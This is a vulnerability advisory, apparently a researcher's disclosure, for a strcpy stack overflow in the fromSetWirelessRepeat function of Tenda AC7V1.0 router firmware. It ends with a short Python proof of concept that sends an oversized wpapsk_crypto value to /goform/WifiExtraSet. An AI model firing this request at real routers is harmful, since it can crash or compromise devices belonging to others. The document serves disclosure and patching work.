## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

In the Tenda AC7V1.0 V15.03.06.44 has a stack overflow vulnerability located in the `fromSetWirelessRepeat` function. This function accepts the `wpapsk_crypto` parameter from a POST request by variable `wpapsk_crypto_0` and passes it to the `set_repeat5` function.

![image-20240318162246812](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318162246812.png)

The array `wpapsk_cryptovalue_0` is fixed at 16 bytes. However, since the user has control over the input of `wpapsk_crypto`, the statement `strcpy(wpapsk_cryptovalue_0, wpapsk_crypto_0);` leads to a buffer overflow. The user-supplied `wpapsk_crypto` can exceed the capacity of the `wpapsk_cryptovalue_0` array, thus triggering this security vulnerability.

![image-20240318161848783](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318161848783.png)

![image-20240318162340724](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318162340724.png)

## PoC

```python
import requests

IP = '192.168.84.101'
url = f"http://{IP}/goform/WifiExtraSet?"
# url += "wl_mode=0&security=wpapsk&wpapsk_key=aaaaaaa&wpapsk_crypto=" + "s" * 0x600
url += "wifi_chkHz=0&wl_mode=0&security=wpapsk&wpapsk_key=aaaaaaa&wpapsk_crypto=" + "s" * 0x600

response = requests.get(url)
```

![image-20240318162448019](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318162448019.png)
